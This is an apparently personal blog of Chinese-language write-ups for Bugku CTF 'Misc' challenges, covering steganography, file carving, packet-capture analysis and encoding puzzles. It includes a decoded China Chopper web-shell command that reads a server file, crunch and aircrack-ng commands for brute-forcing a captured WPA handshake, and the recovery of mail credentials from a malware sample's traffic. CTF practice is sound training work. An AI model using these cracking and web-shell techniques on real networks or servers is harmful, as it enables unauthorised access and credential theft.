class="headerlink" title="隐写"></a>隐写</h2><p>解压有个PNG图片，修改一下图片大小，再打开图片发现flag</p><p>用UE打开图片，第二行的 0-3 4-7 表示图片的宽高</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526003049905.png" alt="1526003049905"></p><p>flag</p><blockquote><p>BUGKU{a1e5aSA}</p></blockquote><h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><p>key格式flag{xxxxxxxxxxxxxxxxxxxxxxxxxxx} </p><p>是个pcap文件，发现有很多telnet协议，追踪TCP流发现flag</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526003306147.png" alt="1526003306147"></p><p>flag</p><blockquote><p>flag{d316759c281bf925d600be698a4973d5}</p></blockquote><h2 id="眼见非实-ISCCCTF"><a href="#眼见非实-ISCCCTF" class="headerlink" title="眼见非实(ISCCCTF)"></a>眼见非实(ISCCCTF)</h2><blockquote><p>JPEG (jpg)，                       文件头：FFD8FF　　　　　文件尾：FF D9　　　　　　　　　　　　　　　<br>PNG (png)，                      文件头：89504E47　　　　文件尾：AE 42 60 82<br>GIF (gif)，                           文件头：47494638　　　　文件尾：00 3B<br>ZIP Archive (zip)，            文件头：504B0304　　　  文件尾：50 4B<br>TIFF (tif)，                          文件头：49492A00　　　　　　　　　　　　　<br>Windows Bitmap (bmp)  文件头：424D　　　　　　　　　　　　　　　<br>CAD (dwg)，                      文件头：41433130　　　　　　　　　　　　　<br>Adobe Photoshop (psd)  文件头：38425053　　　　　　　　　　　　　<br>Rich Text Format (rtf)，   文件头：7B5C727466　　　　　　　　　　　　<br>XML (xml)，                       文件头：3C3F786D6C　　　　　　　　　　　　<br>HTML (html)，                   文件头：68746D6C3E<br>Email [thorough only] (eml)，    文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，              文件头：CFAD12FEC5FD746F<br>Outlook (pst)，                              文件头：2142444E<br>MS Word/Excel (xls.or.doc)，      文件头：D0CF11E0<br>MS Access (mdb)，                       文件头：5374616E64617264204A<br>WordPerfect (wpd)，                    文件头：FF575043<br>Adobe Acrobat (pdf)，                  文件头：255044462D312E<br>Quicken (qdf)，                              文件头：AC9EBD8F<br>Windows Password (pwl)，         文件头：E3828596</p><p>RAR Archive (rar)，                       文件头：52617221<br>Wave (wav)，                                 文件头：57415645<br>AVI (avi)，                                       文件头：41564920<br>Real Audio (ram)，                       文件头：2E7261FD<br>Real Media (rm)，                         文件头：2E524D46<br>MPEG (mpg)，                               文件头：000001BA<br>MPEG (mpg)，                               文件头：000001B3<br>Quicktime (mov)，                        文件头：6D6F6F76<br>Windows Media (asf)，                文件头：3026B2758E66CF11<br>MIDI (mid)，                                  文件头：4D546864</p></blockquote><p>用UE打开，敏感发现50 4B 03 04</p><p>改后缀为.zip，解压发现word文档，打开错误，UE发现word文档开头还是 50 4B 03 04 继续改为zip后缀</p><p>解压后在 word文件夹下的document.xml发现flag</p><blockquote><p>flag{F1@g}</p></blockquote><h2 id="又一张图片，还单纯吗"><a href="#又一张图片，还单纯吗" class="headerlink" title="又一张图片，还单纯吗"></a>又一张图片，还单纯吗</h2><p>用binwalk分解没成功，用foremost分解得到另外一张图片</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526005846765.png" alt="1526005846765"></p><p>flag</p><blockquote><p>falg{NSCTF_e6532a34928a3d1dadd0b049d5a3cc57}</p></blockquote><h2 id="猜"><a href="#猜" class="headerlink" title="猜"></a>猜</h2><p>百度识图</p><p>flag</p><blockquote><p>key{liuyifei}</p></blockquote><h2 id="宽带信息泄露"><a href="#宽带信息泄露" class="headerlink" title="宽带信息泄露"></a>宽带信息泄露</h2><p>题目中给出一个conf.bin文件，主要是工具，用routerpassview打开，然后找到username<br>题目中给出了提示，flag是宽带用户名。</p><blockquote><p>flag{053700357621}</p></blockquote><h2 id="隐写2"><a href="#隐写2" class="headerlink" title="隐写2"></a>隐写2</h2><p>binwalk 分解得到 flag.rar 提示.jpg</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526007063925.png" alt="1526007063925"></p><p>压缩包解压需要密码，尝试了一下不是伪加密，使用ARCHPR爆破得到密码</p><p>解压得到3.jpg，UE发现3.jpg 文件尾后面有</p><blockquote><p>f1@g{eTB1IEFyZSBhIGhAY2tlciE=}</p></blockquote><p>把{}里base64解码一下，把f1@g 改为 flag</p><blockquote><p>flag{y0u Are a h@cker!}</p></blockquote><h2 id="多种方法解决"><a href="#多种方法解决" class="headerlink" title="多种方法解决"></a>多种方法解决</h2><p>UE打开是个base64之后的图片</p><p>base64转图片的网址：<a href="http://www.vgot.net/test/image2base64.php" target="_blank" rel="noopener">http://www.vgot.net/test/image2base64.php</a>?</p><p>注意base64转图片时，前面<code>data:image/jpg;base64,</code> 去掉</p><p>转了之后得到一张二维码</p><p>识别二维码：<a href="https://cli.im/deqr" target="_blank" rel="noopener">https://cli.im/deqr</a></p><blockquote><p>KEY{dca57f966e4e4e31fd5b15417da63269} </p></blockquote><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p>解压，UE打开，发现很多都是00，直接搜索key</p><blockquote><p>key{feb81d3834e2423c9903f4755464060b}</p></blockquote><h2 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h2><p>追踪TCP流</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526009265898.png" alt="1526009265898"></p><p>base64解码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);if(PHP_VERSION&lt;&apos;5.3.0&apos;)&#123;@set_magic_quotes_runtime(0);&#125;;echo(&quot;X@Y&quot;);$F=&quot;C:\\wwwroot\\flag.tar.gz&quot;;$fp=@fopen($F,&apos;r&apos;);if(@fgetc($fp))&#123;@fclose($fp);@readfile($F);&#125;else&#123;echo(&apos;ERROR:// Can Not Read&apos;);&#125;;echo(&quot;X@Y&quot;);die();</span><br><span class="line">Ü</span><br></pre></td></tr></table></figure><p>发现</p><blockquote><p>flag.tar.gz</p></blockquote><p>提取出来解压得到flag.txt</p><blockquote><p>key{8769fe393f2b998fa6a11afe2bfcd65e}</p></blockquote><h2 id="这么多数据包"><a href="#这么多数据包" class="headerlink" title="这么多数据包"></a>这么多数据包</h2><p>根据提示要找getshell流，wireshark打开CTF.pcagng<br>先大致浏览一下，不难发现从第104个包开始应该是攻击机（192.168.116.138）在向目标机（192.168.116.159）进行端口扫描</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526036728234.png" alt="1526036728234"></p><p>追踪流——&gt;TCP可以看到其中有一个s4cr4t.txt的文件，base64解码得到flag<br>Q0NURntkb195b3VfbGlrZV9zbmlmZmVyfQ==</p><blockquote><p>CCTF{do_you_like_sniffer}</p></blockquote><h2 id="隐写3"><a href="#隐写3" class="headerlink" title="隐写3"></a>隐写3</h2><p>一看这图片就是被裁剪了，UE修改一下大小就看到flag了</p><blockquote><p>flag{He1l0_d4_ba1}</p></blockquote><h2 id="做个游戏-08067CTF"><a href="#做个游戏-08067CTF" class="headerlink" title="做个游戏(08067CTF)"></a>做个游戏(08067CTF)</h2><p>这里用Java Decompiler 工具反编译。</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526037823047.png" alt="1526037823047"></p><blockquote><p>flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}</p></blockquote><blockquote><p>flag{DajiDali_JinwanChiji}</p></blockquote><h2 id="想蹭网先解开密码"><a href="#想蹭网先解开密码" class="headerlink" title="想蹭网先解开密码"></a>想蹭网先解开密码</h2><p>hint</p><blockquote><p>flag格式：flag{你破解的WiFi密码}</p><p>tips：密码为手机号，为了不为难你，大佬特地让我悄悄地把前七位告诉你<br>1391040<strong>\</strong><br>Goodluck!!</p><p>作者@NewBee</p></blockquote><p>提示WIFI密码为手机号。下载下来是一个cap包，用wireshark打开。WIFI连接认证的重点在WPA的四次握手包，<br>也就是eapol协议的包，过滤一下——</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526038800022.png" alt="1526038800022"></p><p>正好四个包，接下来就是破解密码了，因为已经给了11位手机号的前七位，使用crunch生成一个密码字典，然后<br>进行破解</p><p><a href="http://netsecurity.51cto.com/art/201706/541638.htm" target="_blank" rel="noopener">Linux密码生成工具crunch使用攻略</a></p><blockquote><p>crunch 11 11 -t 1391040%%%% &gt;&gt;wifipassword.txt</p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526038848121.png" alt="1526038848121"></p><blockquote><p>aircrack-ng wifi.cap -w wifipassword.txt</p></blockquote><p>参数选择3 因为前两个为空</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526038909459.png" alt="1526038909459"></p><blockquote><p>KEY FOUND! [ 13910407686 ]</p></blockquote><p>可以用脚本写字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"1391040"</span></span><br><span class="line">t = <span class="string">""</span></span><br><span class="line">file = open(<span class="string">'data.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>): <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">t = s + str(i) + str(j) + str(k) + str(l) file.write(t)</span><br><span class="line">file.write(<span class="string">'\n'</span>)</span><br><span class="line">file.close()</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><h2 id="Linux2"><a href="#Linux2" class="headerlink" title="Linux2"></a>Linux2</h2><p>跟Linux1 一样，解压之后UE搜索</p><blockquote><p>KEY{24f3627a86fc740a7f36ee2c7a1c124a}</p></blockquote><h2 id="账号被盗了"><a href="#账号被盗了" class="headerlink" title="账号被盗了"></a>账号被盗了</h2><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526744297018.png" alt="1526744297018"></p><p>下载个CF外挂的exe</p><p>用wireshark抓包，exe账号密码随便写</p><p>然后过滤smtp，追踪TCP。圈起来的base64解码是163邮箱的账号和密码，登录找到flag</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526744401043.png" alt="1526744401043"></p><blockquote><p>flag{182100518+725593795416}</p></blockquote><h2 id="细心的大象"><a href="#细心的大象" class="headerlink" title="细心的大象"></a>细心的大象</h2><p>解压得到一张大象的图片</p><p>binwalk看一看发现后面有RAR</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526745078981.png" alt="1526745078981"></p><p>分解得到个加密的压缩包</p><p>查看大象的图片属性，备注有个字符串</p><blockquote><p>TVNEUzQ1NkFTRDEyM3p6</p></blockquote><p>base64解码</p><blockquote><p>MSDS456ASD123zz</p></blockquote><p>用这个去解密压缩包，得到2.jpg</p><p>修改一下图片大小看到flag</p><blockquote><p>BUGKU{a1e5aSA}</p></blockquote><h2 id="爆照-08067CTF"><a href="#爆照-08067CTF" class="headerlink" title="爆照(08067CTF)"></a>爆照(08067CTF)</h2><blockquote><p>flag格式 flag{xxx_xxx_xxx} </p></blockquote><p>binwalk一看有压缩包，但binwalk分解失败，用foremost分解得到一个zip</p><p>zip解压得到8张jpg和一张gif（直接解压出错，得用命令unzip解压）</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526746186205.png" alt="1526746186205"></p><p>88:二维码扫描得bilibili</p><p>888:复制到windows10，加上jpg，查看属性备注有字符串，base64解码得silisili</p><p>8888:binwalk发现有zip，解压得二维码，扫描得panama</p><blockquote><p>flag{bilibili_silisili_panama}</p></blockquote><h2 id="图穷匕见"><a href="#图穷匕见" class="headerlink" title="图穷匕见"></a>图穷匕见</h2><p>查看属性</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526748648784.png" alt="1526748648784"></p><p>UE查看，jpg FF D9文件尾后面还有很多数字</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526748762224.png" alt="1526748762224"></p><p>提取出来，用notepad++的Converter <strong>16进制-&gt;ASCII</strong>方式解码 </p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526748823481.png" alt="1526748823481"></p><p>这是坐标的形式</p><p>这时候再结合<strong>会画图吗</strong>的提示，将这些坐标做成一张图即可，用<strong>gnuplot</strong>这个工具比较方便，因此将坐标转为gnuplot能识别的格式 <strong>坐标1 坐标2</strong> </p><blockquote><p>kali安装gnuplot：sudo apt-get install gnuplot-x11<br>plot “/root/Desktop/111.txt”<br>但windows下是使用 plot “C:\Users\Asus\Desktop\111.txt”</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/Bugku# gnuplot</span><br><span class="line">gnuplot&gt; plot &quot;paintpaintpaint.txt&quot;</span><br><span class="line">注意调整一下比例，弄得高一点就可以扫描成功</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526748891397.png" alt="1526748891397"></p><blockquote><p>flag{40fc0a979f759c8892f4dc045e28b820}  </p></blockquote><p>参考：<a href="https://www.cnblogs.com/WangAoBo/p/6950547.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/6950547.html</a></p><h2 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h2><p>题目给了一串二进制字符，转为16进制 ,52617221是RAR的文件头，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">526172211A0700CF907300000D00000000000000F7C07420902C000D09000059220000023E6370190A59B34A1D330700200000006B65792E6A706700F014A319101D911508917C9015EACB02ECD08228A0B868B4D082A05DB62880816089A944DAA0A0DA68B3426CB02CC44D29A1445404474882209A501D06C5411514313101044D5DC6C050B5440C14B4103B1607446C0E0F71EB11DF1CCEF7C33C4FB91313C999FAA7EE4C473C262BF989D1F54CCD4E88FA3F7EA9F0A88A8A8A889AAAF09889C7F463FEC0D2ADABAD2B8036580DF85E031FD3A5AC567C6F6DCC2B8B80D783281200F0CDE031C943050297464341E070CBB4AD050F80202966E146372501F14FB13A3E058B645BF47C0B162D91A06FC683C257B22568F8162C5B23EBA3E058B64559980E407C03704F4B03C01EC0B806502B0090374599029F99C6854DC72570C946017729FF72D881BC03EFD8CAB0565CCFB702A04F5D0A7E63E0E4AFA170B9045DCC2E794424FE3E30072AB02B2A312EB0278A20D692E0EAD84053D6C52860A4722F0DEE798D696D6052DAF2B7D07A4C1BAE4814D6D8DA3C8F05E453B111FC16F79246A1748B09B66E7979754F162DCDE1287B5BA701B129A9D1C85BE0F751615A05814073E3A8F6A716C2F3FAC90CD45451BDF494A8C29BDAF3032ECD7062E3AAAB63737ACBEBBB630BEEE989A9F5C5A939AD18729690D541F13DF1C9D5C8BD878AFA7C1CD6B32A8A17DAFC9E17BE84E1684A4A0EED6DA9EC1B757FE0A850971FF1F18F796253DA5A53A3B90CE153B24163068B1A352422A92F049CCBF1F124BBD0D085E6822FFE2404AE2BFB01A3E4058B6473FB8D1F202C58B647AFFEC83F1A55B63985A497B0B48AC7B402A804999988333212232C3434126A6E77A437363637D569B4E72767FAB4140CBCF8F852225230A424843CC28FB4D7240CD8ECB2841464E514D1AA09497B21BA16018D3242F6373DD2690F46EB0FB5837267E3D300E84816415A1C32100C0E8307CBB1FC00410BA930C836547DF63D0C601CC4CB3B012686A6C1149ED29761758730310E646462621557E0AB80C4E8CB4DACD8AA19E9D7C78842763B1B0315D31287B6EC77B50C15B7C8897C077822FCD49E1EEAB568BAD4647D76BF65B34CDA26A727AAEDD595D6165696D85898D919777BC666A0B60D20DCDEE0F0F245E9EDF093EC1F1212161A1F8BC68B8CE5C6F323B9BCEE7C97524E53AB2B2D2F31D9ED4ECF4FD050D151D3F7FC1E1A8F178EA6AABBCD5F61E7B1F45959FA49DC5CDD7ABD7777852FF03F7C1F87C708AFCB0F4319CF38386FB8CADE7590E7AB9EB1888CAC6627BD028745C39EB19E99517C40F76D3A1161277B6CF672434434B60BED416ADCF551365E945BFD0C6FFD47F4F1A82C9EBC9CFE319B301B87C90C0EB3A700E06161A3C9401AFFFACD54751096D052D73DA3E0CBB3892562899A55DF576FF9526B3D394B3E1DFA8CB07A5D5E372FC8A74B070B691F71AAC3B099FCED19FAA473A9E43074532A0420C6BBA969AB27717714D58ACECE713EBF7A47A3D7B58711832DF30DD55C9469F63D76B61C28B42854385C4AF0D656CD0CF64ADEAB5F2456B5DA8BF532648CDED71312D18C6471491C949C814B28D6F971BAA1AFC16E9A9A2641B63C359A5CE909A258E0F01B26E0E2B455576A2CE2B799D7A94D29A04D91EE242239BA489B6B358717FFBB541F1BBA277E25384729C6A922755EC140C87BC18A4A2D5CF799A9D182528B5053985192CD147C1694C071A8265DBAD793F187A43B9045DEC6401C61F62F3D33DE514D4E21A536D6A12DA085F8DB7472256E625EA77B1757F6B61206FBC6F3C5237A27EDE29AB48382CA960458CD8AC9CAE4F76E7FB911573FCE45E4A6DAC321ECFCAF921507455CEF6DC44F37F1266935EEDC86EBEE9422647FA7D9106D24C4B49637B3B445593D4E9B17E24F45858A3E1D7984F7B48B7EB0E777ACFBBDC470F61EEF569ED1586C118C39F07B4CD32249BF9D4E42FB87C7C8A592E4D002E0F9976B7D88BCB33BB0A995A48B27BBEEB51AC7F921D3F7FC32313713876DF87751BDB4CE1BD5CC63C12E2D04F01F5A2325F5B3528A9C2875F6CDEFB9456136630F0A1D2540737471E2A7A36AE4C6A95336D34EA432BA6B0620FC6B6C6A320EB5EB854489852657AAF12965158E05139C09136E2DFEAE9D8ED9024385EC292F14BBF54848621F414EAD571B16C1F9029FE3EBA6D4CAEE3A2CF6D2CDAC075BAC65D1085C9D2159FB76725EE23D33B3C9F918E20BDB481C56E30A62B08D6B221729503198C8B2506C4B8161DB52F4B23468C71E256FC12597C2802894D20FB68F6E93E3CFBBCBEEF19471AC01A8C910D77AE8029FF7FD35F66FC81515A568FDEEB51ED1986CB42CA83703843FBA4C6F99BB32972D47AE7C8514730FF1005C972B9D7FA103975DB6D198F311A2AB4FF55E6F780920B3139D5526A283DFFD2552B9712EDF946C4C444D0A3272366E3F9F7E8D139FBD4BAB222FA0FCF38CD77A9E43AE82B60B59C145640B21EC9A7E1EDA5C3D3B2CE58F34AD2D3DB8AB1237895253D0F4D30870FF298345FF2A72949D76FDE471C0EB9DD436351D4FCFD93536CFDED5B6CBF52F06EECA0C9370E433214DFE49DECE8B2B0EE4E75A57A99A8EB291D30EE98B0624E3DEC97DCDE656F3ACCDBAFB9432B0C7D8DA8A2B8166EE367F1ECB6D04FF1ED2A291A949C209FD2D9D48CAB7E1BE38AE2762BD028713D07D1B43C05D953B8029D4B5E64BE045D541DD617896EFD04F3C3D65A9951BD9970BE34E2E046C3A6AFD63AB8DB6C3F5EEA3DA55E70DCD927B0746377A4E14C87066EC39B8F9A49FD19A8BB1D24825447AA0ECCB8C8FE1D5DE3D71E5A479CFB03ED70C37C827439BBA3E0B037E76132A670570C3DDAB3BDBA55F9BF750E76084BCCCD0EE5D2863B7BEBE302F540F0C5629DE8C7C19E012F1517587719FF00DFB59EECDC37C98F7C22A1724EEE7FCE36EEC62D414E0AA861CA760CB76DA65AA49B49CF79467A26AB64C04D66C8E1950E0D4CFD760DB7907266CDB8D871227511096800A99B11E0305D3C71A0D3B779D17A90833005FE57F6F35699EBAD7A7A0FC8188BB5F010F1F507501F3F3D446939ADA2BF6B533EFA7F8028A3D3BF8AD6B0CE3A03E0E3B08F3F48428767B5B4E3AD1D7EDD8BDB0B1B1E6A64E49E730E512CC7E8CC305709CE8903D9CA6C3B75B3D2C4665B79E8F290F2FDF449982D740CAAB1DAF06FE565C6C64C4AA39AF619691338D643DD789C1428CAAE4E2447C986EFEA0497F365767FD7A60A3DB3A152AFC3470DD2627FB569FAF6BC75E8BBA5D9280D55D2C62F87E72FB698C5B00F77AEAFFE74DFE8308C7B2FF28C43D7B00400700</span><br></pre></td></tr></table></figure><p>把这16进制串写入RAR，解压得到一张图片</p><p>查看图片属性，发现base64，解码</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526781473383.png" alt="1526781473383"></p><blockquote><p>flag{01a25ea3fd6349c6e635a1d0196e75fb}</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/5/20 9:44</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : 多种进制转换.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description :</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">__author__ = <span class="string">'Mang0'</span></span><br><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">base = [str(x) <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)] + [chr(x) <span class="keyword">for</span> x <span class="keyword">in</span> range(ord(<span class="string">'A'</span>), ord(<span class="string">'A'</span>) + <span class="number">6</span>)]</span><br><span class="line"><span class="comment"># bin2dec</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin2dec</span><span class="params">(string_num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str(int(string_num, <span class="number">2</span>))</span><br><span class="line"><span class="comment"># hex2dec</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex2dec</span><span class="params">(string_num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str(int(string_num.upper(), <span class="number">16</span>))</span><br><span class="line"><span class="comment"># dec2bin</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec2bin</span><span class="params">(string_num)</span>:</span></span><br><span class="line">    num = int(string_num)</span><br><span class="line">    mid = []</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        num, rem = divmod(num, <span class="number">2</span>)</span><br><span class="line">        mid.append(base[rem])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([str(x) <span class="keyword">for</span> x <span class="keyword">in</span> mid[::<span class="number">-1</span>]])</span><br><span class="line"><span class="comment"># dec2hex</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec2hex</span><span class="params">(string_num)</span>:</span></span><br><span class="line">    num = int(string_num)</span><br><span class="line">    mid = []</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        num, rem = divmod(num, <span class="number">16</span>)</span><br><span class="line">        mid.append(base[rem])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([str(x) <span class="keyword">for</span> x <span class="keyword">in</span> mid[::<span class="number">-1</span>]])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># hex2tobin</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex2bin</span><span class="params">(string_num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span>  dec2bin(hex2dec(string_num.upper()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># bin2hex</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin2hex</span><span class="params">(string_num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> dec2hex(bin2dec(string_num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    file1 = open(<span class="string">r'E:\CTF\misc\Bugku\1.txt'</span>)</span><br><span class="line">    s = file1.read()</span><br><span class="line">    hexx = bin2hex(s)</span><br><span class="line">    <span class="keyword">print</span> (hexx)</span><br><span class="line">    file2 = open(<span class="string">r'E:\CTF\misc\Bugku\cover.rar'</span>, <span class="string">'wb'</span>)</span><br><span class="line">    file2.write(binascii.a2b_hex(hexx))</span><br></pre></td></tr></table></figure><h2 id="听首音乐"><a href="#听首音乐" class="headerlink" title="听首音乐"></a>听首音乐</h2><p> 解压有个wav的音频</p><p>用Audacity打开，，发现上面有一串点横，联想到摩斯密码</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526783809280.png" alt="1526783809280"></p><blockquote><p>····· -··· -·-· —-· ··— ····· -···· ····- —-· -·-· -··· —– ·—- —·· —·· ··-· ····· ··— · -···· ·—- –··· -·· –··· —– —-· ··— —-· ·—- —-· ·—- -·-·</p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526783875098.png" alt="1526783875098"></p><p>注意要把小写字母转为大写</p><blockquote><p>5BC925649CB0188F52E617D70929191C</p></blockquote><h2 id="好多数值"><a href="#好多数值" class="headerlink" title="好多数值"></a>好多数值</h2><blockquote><p>flag格式 flag{} </p></blockquote><p>下载打开一看，RGB，图片大小不知道大佬们怎么测试出来的</p><figure class="highlight python"><table><tr><td 